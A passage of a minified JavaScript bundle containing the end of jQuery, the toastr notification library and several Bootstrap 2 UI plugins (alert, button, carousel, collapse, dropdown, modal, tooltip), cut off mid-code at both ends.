t.offsetWidth>0||t.offsetHeight>0||t.getClientRects().length>0};var be=/%20/g,we=/\[\]$/,xe=/\r?\n/g,Ce=/^(?:submit|button|image|reset|file)$/i,ke=/^(?:input|select|textarea|keygen)/i;function Se(t,e,i,a){var o;if(h.isArray(e))h.each(e,(function(e,o){i||we.test(t)?a(t,o):Se(t+"["+("object"==typeof o&&null!=o?e:"")+"]",o,i,a)}));else if(i||"object"!==h.type(e))a(t,e);else for(o in e)Se(t+"["+o+"]",e[o],i,a)}h.param=function(t,e){var i,a=[],o=function(t,e){e=h.isFunction(e)?e():null==e?"":e,a[a.length]=encodeURIComponent(t)+"="+encodeURIComponent(e)};if(void 0===e&&(e=h.ajaxSettings&&h.ajaxSettings.traditional),h.isArray(t)||t.jquery&&!h.isPlainObject(t))h.each(t,(function(){o(this.name,this.value)}));else for(i in t)Se(i,t[i],e,o);return a.join("&").replace(be,"+")},h.fn.extend({serialize:function(){return h.param(this.serializeArray())},serializeArray:function(){return this.map((function(){var t=h.prop(this,"elements");return t?h.makeArray(t):this})).filter((function(){var t=this.type;return this.name&&!h(this).is(":disabled")&&ke.test(this.nodeName)&&!Ce.test(t)&&(this.checked||!J.test(t))})).map((function(t,e){var i=h(this).val();return null==i?null:h.isArray(i)?h.map(i,(function(t){return{name:e.name,value:t.replace(xe,"\r\n")}})):{name:e.name,value:i.replace(xe,"\r\n")}})).get()}}),h.ajaxSettings.xhr=function(){try{return new t.XMLHttpRequest}catch(t){}};var Te={0:200,1223:204},_e=h.ajaxSettings.xhr();p.cors=!!_e&&"withCredentials"in _e,p.ajax=_e=!!_e,h.ajaxTransport((function(e){var i,a;return p.cors||_e&&!e.crossDomain?{send:function(o,n){var r,s=e.xhr();if(s.open(e.type,e.url,e.async,e.username,e.password),e.xhrFields)for(r in e.xhrFields)s[r]=e.xhrFields[r];for(r in e.mimeType&&s.overrideMimeType&&s.overrideMimeType(e.mimeType),e.crossDomain||o["X-Requested-With"]||(o["X-Requested-With"]="XMLHttpRequest"),o)s.setRequestHeader(r,o[r]);i=function(t){return function(){i&&(i=a=s.onload=s.onerror=s.onabort=s.onreadystatechange=null,"abort"===t?s.abort():"error"===t?"number"!=typeof s.status?n(0,"error"):n(s.status,s.statusText):n(Te[s.status]||s.status,s.statusText,"text"!==(s.responseType||"text")||"string"!=typeof s.responseText?{binary:s.response}:{text:s.responseText},s.getAllResponseHeaders()))}},s.onload=i(),a=s.onerror=i("error"),void 0!==s.onabort?s.onabort=a:s.onreadystatechange=function(){4===s.readyState&&t.setTimeout((function(){i&&a()}))},i=i("abort");try{s.send(e.hasContent&&e.data||null)}catch(t){if(i)throw t}},abort:function(){i&&i()}}:void 0})),h.ajaxSetup({accepts:{script:"text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"},contents:{script:/\b(?:java|ecma)script\b/},converters:{"text script":function(t){return h.globalEval(t),t}}}),h.ajaxPrefilter("script",(function(t){void 0===t.cache&&(t.cache=!1),t.crossDomain&&(t.type="GET")})),h.ajaxTransport("script",(function(t){var e,i;if(t.crossDomain)return{send:function(o,n){e=h("<script>").prop({charset:t.scriptCharset,src:t.url}).on("load error",i=function(t){e.remove(),i=null,t&&n("error"===t.type?404:200,t.type)}),a.head.appendChild(e[0])},abort:function(){i&&i()}}}));var Ee=[],De=/(=)\?(?=&|$)|\?\?/;h.ajaxSetup({jsonp:"callback",jsonpCallback:function(){var t=Ee.pop()||h.expando+"_"+re++;return this[t]=!0,t}}),h.ajaxPrefilter("json jsonp",(function(e,i,a){var o,n,r,s=!1!==e.jsonp&&(De.test(e.url)?"url":"string"==typeof e.data&&0===(e.contentType||"").indexOf("application/x-www-form-urlencoded")&&De.test(e.data)&&"data");return s||"jsonp"===e.dataTypes[0]?(o=e.jsonpCallback=h.isFunction(e.jsonpCallback)?e.jsonpCallback():e.jsonpCallback,s?e[s]=e[s].replace(De,"$1"+o):!1!==e.jsonp&&(e.url+=(se.test(e.url)?"&":"?")+e.jsonp+"="+o),e.converters["script json"]=function(){return r||h.error(o+" was not called"),r[0]},e.dataTypes[0]="json",n=t[o],t[o]=function(){r=arguments},a.always((function(){void 0===n?h(t).removeProp(o):t[o]=n,e[o]&&(e.jsonpCallback=i.jsonpCallback,Ee.push(o)),r&&h.isFunction(n)&&n(r[0]),r=n=void 0})),"script"):void 0})),h.parseHTML=function(t,e,i){if(!t||"string"!=typeof t)return null;"boolean"==typeof e&&(i=e,e=!1),e=e||a;var o=C.exec(t),n=!i&&[];return o?[e.createElement(o[1])]:(o=tt([t],e,n),n&&n.length&&h(n).remove(),h.merge([],o.childNodes))};var Ae=h.fn.load;function Fe(t){return h.isWindow(t)?t:9===t.nodeType&&t.defaultView}h.fn.load=function(t,e,i){if("string"!=typeof t&&Ae)return Ae.apply(this,arguments);var a,o,n,r=this,s=t.indexOf(" ");return s>-1&&(a=h.trim(t.slice(s)),t=t.slice(0,s)),h.isFunction(e)?(i=e,e=void 0):e&&"object"==typeof e&&(o="POST"),r.length>0&&h.ajax({url:t,type:o||"GET",dataType:"html",data:e}).done((function(t){n=arguments,r.html(a?h("<div>").append(h.parseHTML(t)).find(a):t)})).always(i&&function(t,e){r.each((function(){i.apply(this,n||[t.responseText,e,t])}))}),this},h.each(["ajaxStart","ajaxStop","ajaxComplete","ajaxError","ajaxSuccess","ajaxSend"],(function(t,e){h.fn[e]=function(t){return this.on(e,t)}})),h.expr.filters.animated=function(t){return h.grep(h.timers,(function(e){return t===e.elem})).length},h.offset={setOffset:function(t,e,i){var a,o,n,r,s,l,c=h.css(t,"position"),d=h(t),p={};"static"===c&&(t.style.position="relative"),s=d.offset(),n=h.css(t,"top"),l=h.css(t,"left"),("absolute"===c||"fixed"===c)&&(n+l).indexOf("auto")>-1?(r=(a=d.position()).top,o=a.left):(r=parseFloat(n)||0,o=parseFloat(l)||0),h.isFunction(e)&&(e=e.call(t,i,h.extend({},s))),null!=e.top&&(p.top=e.top-s.top+r),null!=e.left&&(p.left=e.left-s.left+o),"using"in e?e.using.call(t,p):d.css(p)}},h.fn.extend({offset:function(t){if(arguments.length)return void 0===t?this:this.each((function(e){h.offset.setOffset(this,t,e)}));var e,i,a=this[0],o={top:0,left:0},n=a&&a.ownerDocument;return n?(e=n.documentElement,h.contains(e,a)?(o=a.getBoundingClientRect(),i=Fe(n),{top:o.top+i.pageYOffset-e.clientTop,left:o.left+i.pageXOffset-e.clientLeft}):o):void 0},position:function(){if(this[0]){var t,e,i=this[0],a={top:0,left:0};return"fixed"===h.css(i,"position")?e=i.getBoundingClientRect():(t=this.offsetParent(),e=this.offset(),h.nodeName(t[0],"html")||(a=t.offset()),a.top+=h.css(t[0],"borderTopWidth",!0),a.left+=h.css(t[0],"borderLeftWidth",!0)),{top:e.top-a.top-h.css(i,"marginTop",!0),left:e.left-a.left-h.css(i,"marginLeft",!0)}}},offsetParent:function(){return this.map((function(){for(var t=this.offsetParent;t&&"static"===h.css(t,"position");)t=t.offsetParent;return t||Et}))}}),h.each({scrollLeft:"pageXOffset",scrollTop:"pageYOffset"},(function(t,e){var i="pageYOffset"===e;h.fn[t]=function(a){return N(this,(function(t,a,o){var n=Fe(t);return void 0===o?n?n[e]:t[a]:void(n?n.scrollTo(i?n.pageXOffset:o,i?o:n.pageYOffset):t[a]=o)}),t,a,arguments.length)}})),h.each(["top","left"],(function(t,e){h.cssHooks[e]=At(p.pixelPosition,(function(t,i){return i?(i=Dt(t,e),St.test(i)?h(t).position()[e]+"px":i):void 0}))})),h.each({Height:"height",Width:"width"},(function(t,e){h.each({padding:"inner"+t,content:e,"":"outer"+t},(function(i,a){h.fn[a]=function(a,o){var n=arguments.length&&(i||"boolean"!=typeof a),r=i||(!0===a||!0===o?"margin":"border");return N(this,(function(e,i,a){var o;return h.isWindow(e)?e.document.documentElement["client"+t]:9===e.nodeType?(o=e.documentElement,Math.max(e.body["scroll"+t],o["scroll"+t],e.body["offset"+t],o["offset"+t],o["client"+t])):void 0===a?h.css(e,i,r):h.style(e,i,a,r)}),e,n?a:void 0,n,null)}}))})),h.fn.extend({bind:function(t,e,i){return this.on(t,null,e,i)},unbind:function(t,e){return this.off(t,null,e)},delegate:function(t,e,i,a){return this.on(e,t,i,a)},undelegate:function(t,e,i){return 1===arguments.length?this.off(t,"**"):this.off(e,t||"**",i)},size:function(){return this.length}}),h.fn.andSelf=h.fn.addBack,"function"==typeof define&&define.amd&&define("jquery",[],(function(){return h}));var Oe=t.jQuery,Me=t.$;return h.noConflict=function(e){return t.$===h&&(t.$=Me),e&&t.jQuery===h&&(t.jQuery=Oe),h},e||(t.jQuery=t.$=h),h})),function(t){t(["jquery"],(function(t){return function(){function e(e,i){return e||(e=r()),(l=t("#"+e.containerId)).length||i&&(l=function(e){return(l=t("<div/>").attr("id",e.containerId).addClass(e.positionClass)).appendTo(t(e.target)),l}(e)),l}function i(e){for(var i=l.children(),o=i.length-1;o>=0;o--)a(t(i[o]),e)}function a(e,i,a){var o=!(!a||!a.force)&&a.force;return!(!e||!o&&0!==t(":focus",e).length||(e[i.hideMethod]({duration:i.hideDuration,easing:i.hideEasing,complete:function(){s(e)}}),0))}function o(t){c&&c(t)}function n(i){function a(t){return null==t&&(t=""),t.replace(/&/g,"&amp;").replace(/"/g,"&quot;").replace(/'/g,"&#39;").replace(/</g,"&lt;").replace(/>/g,"&gt;")}function n(e){var i=e&&!1!==f.closeMethod?f.closeMethod:f.hideMethod,a=e&&!1!==f.closeDuration?f.closeDuration:f.hideDuration,n=e&&!1!==f.closeEasing?f.closeEasing:f.hideEasing;if(!t(":focus",v).length||e)return clearTimeout(x.intervalId),v[i]({duration:a,easing:n,complete:function(){s(v),clearTimeout(g),f.onHidden&&"hidden"!==C.state&&f.onHidden(),C.state="hidden",C.endTime=new Date,o(C)}})}function c(){(f.timeOut>0||f.extendedTimeOut>0)&&(g=setTimeout(n,f.extendedTimeOut),x.maxHideTime=parseFloat(f.extendedTimeOut),x.hideEta=(new Date).getTime()+x.maxHideTime)}function u(){clearTimeout(g),x.hideEta=0,v.stop(!0,!0)[f.showMethod]({duration:f.showDuration,easing:f.showEasing})}function h(){var t=(x.hideEta-(new Date).getTime())/x.maxHideTime*100;b.width(t+"%")}var f=r(),m=i.iconClass||f.iconClass;if(void 0!==i.optionsOverride&&(f=t.extend(f,i.optionsOverride),m=i.optionsOverride.iconClass||m),!function(t,e){if(t.preventDuplicates){if(e.message===d)return!0;d=e.message}return!1}(f,i)){p++,l=e(f,!0);var g=null,v=t("<div/>"),y=t("<div/>"),$=t("<div/>"),b=t("<div/>"),w=t(f.closeHtml),x={intervalId:null,hideEta:null,maxHideTime:null},C={toastId:p,state:"visible",startTime:new Date,options:f,map:i};return i.iconClass&&v.addClass(f.toastClass).addClass(m),function(){if(i.title){var t=i.title;f.escapeHtml&&(t=a(i.title)),y.append(t).addClass(f.titleClass),v.append(y)}}(),function(){if(i.message){var t=i.message;f.escapeHtml&&(t=a(i.message)),$.append(t).addClass(f.messageClass),v.append($)}}(),f.closeButton&&(w.addClass(f.closeClass).attr("role","button"),v.prepend(w)),f.progressBar&&(b.addClass(f.progressClass),v.prepend(b)),f.rtl&&v.addClass("rtl"),f.newestOnTop?l.prepend(v):l.append(v),function(){var t="";switch(i.iconClass){case"toast-success":case"toast-info":t="polite";break;default:t="assertive"}v.attr("aria-live",t)}(),v.hide(),v[f.showMethod]({duration:f.showDuration,easing:f.showEasing,complete:f.onShown}),f.timeOut>0&&(g=setTimeout(n,f.timeOut),x.maxHideTime=parseFloat(f.timeOut),x.hideEta=(new Date).getTime()+x.maxHideTime,f.progressBar&&(x.intervalId=setInterval(h,10))),f.closeOnHover&&v.hover(u,c),!f.onclick&&f.tapToDismiss&&v.click(n),f.closeButton&&w&&w.click((function(t){t.stopPropagation?t.stopPropagation():void 0!==t.cancelBubble&&!0!==t.cancelBubble&&(t.cancelBubble=!0),f.onCloseClick&&f.onCloseClick(t),n(!0)})),f.onclick&&v.click((function(t){f.onclick(t),n()})),o(C),f.debug&&console&&console.log(C),v}}function r(){return t.extend({},{tapToDismiss:!0,toastClass:"toast",containerId:"toast-container",debug:!1,showMethod:"fadeIn",showDuration:300,showEasing:"swing",onShown:void 0,hideMethod:"fadeOut",hideDuration:1e3,hideEasing:"swing",onHidden:void 0,closeMethod:!1,closeDuration:!1,closeEasing:!1,closeOnHover:!0,extendedTimeOut:1e3,iconClasses:{error:"toast-error",info:"toast-info",success:"toast-success",warning:"toast-warning"},iconClass:"toast-info",positionClass:"toast-top-right",timeOut:5e3,titleClass:"toast-title",messageClass:"toast-message",escapeHtml:!1,target:"body",closeHtml:'<button type="button">&times;</button>',closeClass:"toast-close-button",newestOnTop:!0,preventDuplicates:!1,progressBar:!1,progressClass:"toast-progress",rtl:!1},h.options)}function s(t){l||(l=e()),t.is(":visible")||(t.remove(),t=null,0===l.children().length&&(l.remove(),d=void 0))}var l,c,d,p=0,u={error:"error",info:"info",success:"success",warning:"warning"},h={clear:function(t,o){var n=r();l||e(n),a(t,n,o)||i(n)},remove:function(i){var a=r();return l||e(a),i&&0===t(":focus",i).length?void s(i):void(l.children().length&&l.remove())},error:function(t,e,i){return n({type:u.error,iconClass:r().iconClasses.error,message:t,optionsOverride:i,title:e})},getContainer:e,info:function(t,e,i){return n({type:u.info,iconClass:r().iconClasses.info,message:t,optionsOverride:i,title:e})},options:{},subscribe:function(t){c=t},success:function(t,e,i){return n({type:u.success,iconClass:r().iconClasses.success,message:t,optionsOverride:i,title:e})},version:"2.1.3",warning:function(t,e,i){return n({type:u.warning,iconClass:r().iconClasses.warning,message:t,optionsOverride:i,title:e})}};return h}()}))}("function"==typeof define&&define.amd?define:function(t,e){"undefined"!=typeof module&&module.exports?module.exports=e(require("jquery")):window.toastr=e(window.jQuery)}),function(t){"use strict";t((function(){t.support.transition=function(){var t=function(){var t,e=document.createElement("bootstrap"),i={WebkitTransition:"webkitTransitionEnd",MozTransition:"transitionend",OTransition:"oTransitionEnd otransitionend",transition:"transitionend"};for(t in i)if(void 0!==e.style[t])return i[t]}();return t&&{end:t}}()}))}(window.jQuery),function(t){"use strict";var e='[data-dismiss="alert"]',i=function(i){t(i).on("click",e,this.close)};i.prototype.close=function(e){function i(){a.trigger("closed").remove()}var a,o=t(this),n=o.attr("data-target");n||(n=(n=o.attr("href"))&&n.replace(/.*(?=#[^\s]*$)/,"")),a=t(n),e&&e.preventDefault(),a.length||(a=o.hasClass("alert")?o:o.parent()),a.trigger(e=t.Event("close")),e.isDefaultPrevented()||(a.removeClass("in"),t.support.transition&&a.hasClass("fade")?a.on(t.support.transition.end,i):i())};var a=t.fn.alert;t.fn.alert=function(e){return this.each((function(){var a=t(this),o=a.data("alert");o||a.data("alert",o=new i(this)),"string"==typeof e&&o[e].call(a)}))},t.fn.alert.Constructor=i,t.fn.alert.noConflict=function(){return t.fn.alert=a,this},t(document).on("click.alert.data-api",e,i.prototype.close)}(window.jQuery),function(t){"use strict";var e=function(e,i){this.$element=t(e),this.options=t.extend({},t.fn.button.defaults,i)};e.prototype.setState=function(t){var e="disabled",i=this.$element,a=i.data(),o=i.is("input")?"val":"html";t+="Text",a.resetText||i.data("resetText",i[o]()),i[o](a[t]||this.options[t]),setTimeout((function(){"loadingText"==t?i.addClass(e).attr(e,e):i.removeClass(e).removeAttr(e)}),0)},e.prototype.toggle=function(){var t=this.$element.closest('[data-toggle="buttons-radio"]');t&&t.find(".active").removeClass("active"),this.$element.toggleClass("active")};var i=t.fn.button;t.fn.button=function(i){return this.each((function(){var a=t(this),o=a.data("button"),n="object"==typeof i&&i;o||a.data("button",o=new e(this,n)),"toggle"==i?o.toggle():i&&o.setState(i)}))},t.fn.button.defaults={loadingText:"loading..."},t.fn.button.Constructor=e,t.fn.button.noConflict=function(){return t.fn.button=i,this},t(document).on("click.button.data-api","[data-toggle^=button]",(function(e){var i=t(e.target);i.hasClass("btn")||(i=i.closest(".btn")),i.button("toggle")}))}(window.jQuery),function(t){"use strict";var e=function(e,i){this.$element=t(e),this.$indicators=this.$element.find(".carousel-indicators"),this.options=i,"hover"==this.options.pause&&this.$element.on("mouseenter",t.proxy(this.pause,this)).on("mouseleave",t.proxy(this.cycle,this))};e.prototype={cycle:function(e){return e||(this.paused=!1),this.interval&&clearInterval(this.interval),this.options.interval&&!this.paused&&(this.interval=setInterval(t.proxy(this.next,this),this.options.interval)),this},getActiveIndex:function(){return this.$active=this.$element.find(".item.active"),this.$items=this.$active.parent().children(),this.$items.index(this.$active)},to:function(e){var i=this.getActiveIndex(),a=this;if(!(e>this.$items.length-1||e<0))return this.sliding?this.$element.one("slid",(function(){a.to(e)})):i==e?this.pause().cycle():this.slide(e>i?"next":"prev",t(this.$items[e]))},pause:function(e){return e||(this.paused=!0),this.$element.find(".next, .prev").length&&t.support.transition.end&&(this.$element.trigger(t.support.transition.end),this.cycle(!0)),clearInterval(this.interval),this.interval=null,this},next:function(){if(!this.sliding)return this.slide("next")},prev:function(){if(!this.sliding)return this.slide("prev")},slide:function(e,i){var a,o=this.$element.find(".item.active"),n=i||o[e](),r=this.interval,s="next"==e?"left":"right",l="next"==e?"first":"last",c=this;if(this.sliding=!0,r&&this.pause(),n=n.length?n:this.$element.find(".item")[l](),a=t.Event("slide",{relatedTarget:n[0],direction:s}),!n.hasClass("active")){if(this.$indicators.length&&(this.$indicators.find(".active").removeClass("active"),this.$element.one("slid",(function(){var e=t(c.$indicators.children()[c.getActiveIndex()]);e&&e.addClass("active")}))),t.support.transition&&this.$element.hasClass("slide")){if(this.$element.trigger(a),a.isDefaultPrevented())return;n.addClass(e),n[0].offsetWidth,o.addClass(s),n.addClass(s),this.$element.one(t.support.transition.end,(function(){n.removeClass([e,s].join(" ")).addClass("active"),o.removeClass(["active",s].join(" ")),c.sliding=!1,setTimeout((function(){c.$element.trigger("slid")}),0)}))}else{if(this.$element.trigger(a),a.isDefaultPrevented())return;o.removeClass("active"),n.addClass("active"),this.sliding=!1,this.$element.trigger("slid")}return r&&this.cycle(),this}}};var i=t.fn.carousel;t.fn.carousel=function(i){return this.each((function(){var a=t(this),o=a.data("carousel"),n=t.extend({},t.fn.carousel.defaults,"object"==typeof i&&i),r="string"==typeof i?i:n.slide;o||a.data("carousel",o=new e(this,n)),"number"==typeof i?o.to(i):r?o[r]():n.interval&&o.pause().cycle()}))},t.fn.carousel.defaults={interval:5e3,pause:"hover"},t.fn.carousel.Constructor=e,t.fn.carousel.noConflict=function(){return t.fn.carousel=i,this},t(document).on("click.carousel.data-api","[data-slide], [data-slide-to]",(function(e){var i,a,o=t(this),n=t(o.attr("data-target")||(i=o.attr("href"))&&i.replace(/.*(?=#[^\s]+$)/,"")),r=t.extend({},n.data(),o.data());n.carousel(r),(a=o.attr("data-slide-to"))&&n.data("carousel").pause().to(a).cycle(),e.preventDefault()}))}(window.jQuery),function(t){"use strict";var e=function(e,i){this.$element=t(e),this.options=t.extend({},t.fn.collapse.defaults,i),this.options.parent&&(this.$parent=t(this.options.parent)),this.options.toggle&&this.toggle()};e.prototype={constructor:e,dimension:function(){return this.$element.hasClass("width")?"width":"height"},show:function(){var e,i,a,o;if(!this.transitioning&&!this.$element.hasClass("in")){if(e=this.dimension(),i=t.camelCase(["scroll",e].join("-")),(a=this.$parent&&this.$parent.find("> .accordion-group > .in"))&&a.length){if((o=a.data("collapse"))&&o.transitioning)return;a.collapse("hide"),o||a.data("collapse",null)}this.$element[e](0),this.transition("addClass",t.Event("show"),"shown"),t.support.transition&&this.$element[e](this.$element[0][i])}},hide:function(){var e;!this.transitioning&&this.$element.hasClass("in")&&(e=this.dimension(),this.reset(this.$element[e]()),this.transition("removeClass",t.Event("hide"),"hidden"),this.$element[e](0))},reset:function(t){var e=this.dimension();return this.$element.removeClass("collapse")[e](t||"auto")[0].offsetWidth,this.$element[null!==t?"addClass":"removeClass"]("collapse"),this},transition:function(e,i,a){var o=this,n=function(){"show"==i.type&&o.reset(),o.transitioning=0,o.$element.trigger(a)};this.$element.trigger(i),i.isDefaultPrevented()||(this.transitioning=1,this.$element[e]("in"),t.support.transition&&this.$element.hasClass("collapse")?this.$element.one(t.support.transition.end,n):n())},toggle:function(){this[this.$element.hasClass("in")?"hide":"show"]()}};var i=t.fn.collapse;t.fn.collapse=function(i){return this.each((function(){var a=t(this),o=a.data("collapse"),n=t.extend({},t.fn.collapse.defaults,a.data(),"object"==typeof i&&i);o||a.data("collapse",o=new e(this,n)),"string"==typeof i&&o[i]()}))},t.fn.collapse.defaults={toggle:!0},t.fn.collapse.Constructor=e,t.fn.collapse.noConflict=function(){return t.fn.collapse=i,this},t(document).on("click.collapse.data-api","[data-toggle=collapse]",(function(e){var i,a=t(this),o=a.attr("data-target")||e.preventDefault()||(i=a.attr("href"))&&i.replace(/.*(?=#[^\s]+$)/,""),n=t(o).data("collapse")?"toggle":a.data();a[t(o).hasClass("in")?"addClass":"removeClass"]("collapsed"),t(o).collapse(n)}))}(window.jQuery),function(t){"use strict";function e(){t(a).each((function(){i(t(this)).removeClass("open")}))}function i(e){var i,a=e.attr("data-target");return a||(a=(a=e.attr("href"))&&/#/.test(a)&&a.replace(/.*(?=#[^\s]*$)/,"")),(i=a&&t(a))&&i.length||(i=e.parent()),i}var a="[data-toggle=dropdown]",o=function(e){var i=t(e).on("click.dropdown.data-api",this.toggle);t("html").on("click.dropdown.data-api",(function(){i.parent().removeClass("open")}))};o.prototype={constructor:o,toggle:function(a){var o,n,r=t(this);if(!r.is(".disabled, :disabled"))return n=(o=i(r)).hasClass("open"),e(),n||o.toggleClass("open"),r.focus(),!1},keydown:function(e){var o,n,r,s,l;if(/(38|40|27)/.test(e.keyCode)&&(o=t(this),e.preventDefault(),e.stopPropagation(),!o.is(".disabled, :disabled"))){if(!(s=(r=i(o)).hasClass("open"))||s&&27==e.keyCode)return 27==e.which&&r.find(a).focus(),o.click();(n=t("[role=menu] li:not(.divider):visible a",r)).length&&(l=n.index(n.filter(":focus")),38==e.keyCode&&l>0&&l--,40==e.keyCode&&l<n.length-1&&l++,~l||(l=0),n.eq(l).focus())}}};var n=t.fn.dropdown;t.fn.dropdown=function(e){return this.each((function(){var i=t(this),a=i.data("dropdown");a||i.data("dropdown",a=new o(this)),"string"==typeof e&&a[e].call(i)}))},t.fn.dropdown.Constructor=o,t.fn.dropdown.noConflict=function(){return t.fn.dropdown=n,this},t(document).on("click.dropdown.data-api",e).on("click.dropdown.data-api",".dropdown form",(function(t){t.stopPropagation()})).on("click.dropdown-menu",(function(t){t.stopPropagation()})).on("click.dropdown.data-api",a,o.prototype.toggle).on("keydown.dropdown.data-api",a+", [role=menu]",o.prototype.keydown)}(window.jQuery),function(t){"use strict";var e=function(e,i){this.options=i,this.$element=t(e).delegate('[data-dismiss="modal"]',"click.dismiss.modal",t.proxy(this.hide,this)),this.options.remote&&this.$element.find(".modal-body").load(this.options.remote)};e.prototype={constructor:e,toggle:function(){return this[this.isShown?"hide":"show"]()},show:function(){var e=this,i=t.Event("show");this.$element.trigger(i),this.isShown||i.isDefaultPrevented()||(this.isShown=!0,this.escape(),this.backdrop((function(){var i=t.support.transition&&e.$element.hasClass("fade");e.$element.parent().length||e.$element.appendTo(document.body),e.$element.show(),i&&e.$element[0].offsetWidth,e.$element.addClass("in").attr("aria-hidden",!1),e.enforceFocus(),i?e.$element.one(t.support.transition.end,(function(){e.$element.focus().trigger("shown")})):e.$element.focus().trigger("shown")})))},hide:function(e){e&&e.preventDefault();e=t.Event("hide"),this.$element.trigger(e),this.isShown&&!e.isDefaultPrevented()&&(this.isShown=!1,this.escape(),t(document).off("focusin.modal"),this.$element.removeClass("in").attr("aria-hidden",!0),t.support.transition&&this.$element.hasClass("fade")?this.hideWithTransition():this.hideModal())},enforceFocus:function(){var e=this;t(document).on("focusin.modal",(function(t){e.$element[0]!==t.target&&!e.$element.has(t.target).length&&e.$element.focus()}))},escape:function(){var t=this;this.isShown&&this.options.keyboard?this.$element.on("keyup.dismiss.modal",(function(e){27==e.which&&t.hide()})):this.isShown||this.$element.off("keyup.dismiss.modal")},hideWithTransition:function(){var e=this,i=setTimeout((function(){e.$element.off(t.support.transition.end),e.hideModal()}),500);this.$element.one(t.support.transition.end,(function(){clearTimeout(i),e.hideModal()}))},hideModal:function(){var t=this;this.$element.hide(),this.backdrop((function(){t.removeBackdrop(),t.$element.trigger("hidden")}))},removeBackdrop:function(){this.$backdrop&&this.$backdrop.remove(),this.$backdrop=null},backdrop:function(e){var i=this.$element.hasClass("fade")?"fade":"";if(this.isShown&&this.options.backdrop){var a=t.support.transition&&i;if(this.$backdrop=t('<div class="modal-backdrop '+i+'" />').appendTo(document.body),this.$backdrop.click("static"==this.options.backdrop?t.proxy(this.$element[0].focus,this.$element[0]):t.proxy(this.hide,this)),a&&this.$backdrop[0].offsetWidth,this.$backdrop.addClass("in"),!e)return;a?this.$backdrop.one(t.support.transition.end,e):e()}else!this.isShown&&this.$backdrop?(this.$backdrop.removeClass("in"),t.support.transition&&this.$element.hasClass("fade")?this.$backdrop.one(t.support.transition.end,e):e()):e&&e()}};var i=t.fn.modal;t.fn.modal=function(i){return this.each((function(){var a=t(this),o=a.data("modal"),n=t.extend({},t.fn.modal.defaults,a.data(),"object"==typeof i&&i);o||a.data("modal",o=new e(this,n)),"string"==typeof i?o[i]():n.show&&o.show()}))},t.fn.modal.defaults={backdrop:!0,keyboard:!0,show:!0},t.fn.modal.Constructor=e,t.fn.modal.noConflict=function(){return t.fn.modal=i,this},t(document).on("click.modal.data-api",'[data-toggle="modal"]',(function(e){var i=t(this),a=i.attr("href"),o=t(i.attr("data-target")||a&&a.replace(/.*(?=#[^\s]+$)/,"")),n=o.data("modal")?"toggle":t.extend({remote:!/#/.test(a)&&a},o.data(),i.data());e.preventDefault(),o.modal(n).one("hide",(function(){i.focus()}))}))}(window.jQuery),function(t){"use strict";var e=function(t,e){this.init("tooltip",t,e)};e.prototype={constructor:e,init:function(e,i,a){var o,n,r,s,l;for(this.type=e,this.$element=t(i),this.options=this.getOptions(a),this.enabled=!0,l=(r=this.options.trigger.split(" ")).length;l--;)"click"==(s=r[l])?this.$element.on("click."+this.type,this.options.selector,t.proxy(this.toggle,this)):"manual"!=s&&(o="hover"==s?"mouseenter":"focus",n="hover"==s?"mouseleave":"blur",this.$element.on(o+"."+this.type,this.options.selector,t.proxy(this.enter,this)),this.$element.on(n+"."+this.type,this.options.selector,t.proxy(this.leave,this)));this.options.selector?this._options=t.extend({},this.options,{trigger:"manual",selector:""}):this.fixTitle()},getOptions:function(e){return(e=t.extend({},t.fn[this.type].defaults,this.$element.data(),e)).delay&&"number"==typeof e.delay&&(e.delay={show:e.delay,hide:e.delay}),e},enter:function(e){var i,a=t.fn[this.type].defaults,o={};if(this._options&&t.each(this._options,(function(t,e){a[t]!=e&&(o[t]=e)}),this),!(i=t(e.currentTarget)[this.type](o).data(this.type)).options.delay||!i.options.delay.show)return i.show();clearTimeout(this.timeout),i.hoverState="in",this.timeout=setTimeout((function(){"in"==i.hoverState&&i.show()}),i.options.delay.show)},leave:function(e){var i=t(e.currentTarget)[this.type](this._options).data(this.type);if(this.timeout&&clearTimeout(this.timeout),!i.options.delay||!i.options.delay.hide)return i.hide();i.hoverState="out",this.timeout=setTimeout((function(){"out"==i.hoverState&&i.hide()}),i.options.delay.hide)},show:function(){var e,i,a,o,n,r,s=t.Event("show");if(this.hasContent()&&this.enabled){if(this.$element.trigger(s),s.isDefaultPrevented())return;switch(e=this.tip(),this.setContent(),this.options.animation&&e.addClass("fade"),n="function"==typeof this.options.placement?this.options.placement.call(this,e[0],this.$element[0]):this.options.placement,e.detach().css({top:0,left:0,display:"block"}),this.options.container?e.appendTo(this.options.container):e.insertAfter(this.$element),i=this.getPosition(),a=e[0].offsetWidth,o=e[0].offsetHeight,n){case"bottom":r={top:i.top+i.height,left:i.left+i.width/2-a/2};break;case"top":r={top:i.top-o,left:i.left+i.width/2-a/2};break;case"left":r={top:i.top+i.height/2-o/2,left:i.left-a};break;case"right":r={top:i.top+i.height/2-o/2,left:i.left+i.width}}this.applyPlacement(r,n),this.$element.trigger("shown")}},applyPlacement:function(t,e){var i,a,o,n,r=this.tip(),s=r[0].offsetWidth,l=r[0].offsetHeight;r.offset(t).addClass(e).addClass("in"),i=r[0].offsetWidth,a=r[0].offsetHeight,"top"==e&&a!=l&&(t.top=t.top+l-a,n=!0),"bottom"==e||"top"==e?(o=0,t.left<0&&(o=-2*t.left,t.left=0,r.offset(t),i=r[0].offsetWidth,a=r[0].offsetHeight),this.replaceArrow(o-s+i,i,"left")):this.replaceArrow(a-l,a,"top"),n&&r.offset(t)},replaceArrow:function(t,e,i){this.arrow().css(i,t?50*(1-t/e)+"%":"")},setContent:function(){var t=this.tip(),e=this.getTitle();t.find(".tooltip-inner")[this.options.html?"html":"text"](e),t.removeClass("fade in top bottom left right")},hide:function(){var e=this.tip(),i=t.Event("hide");if(this.$element.trigger(i),!i.isDefaultPrevented())return e.removeClass("in"),t.support.transition&&this.$tip.hasClass("fade")?function(){var i=setTimeout((function(){e.off(t.support.transition.end).detach()}),500);e.one(t.support.transition.end,(function(){clearTimeout(i),e.detach()}))}():e.detach(),this.$element.trigger("hidden"),this},fixTitle:function(){var t=this.$element;(t.attr("title")||"string"!=typeof t.attr("data-original-title"))&&t.attr("data-original-title",t.attr("title")||"").attr("title","")},hasContent:function(){return this.getTitle()},getPosition:function(){var e=this.$element[0];return t.extend({},"function"==typeof e.getBoundingClientRect?e.getBoundingClientRect():{width:e.offsetWidth,height:e.offsetHeight},this.$element.offset())},getTitle:function(){var t=this.$element,e=this.options;return t.attr("data-original-title")||("function"==typeof e.title?e.title.call(t[0]):e.title)},tip:function(){return 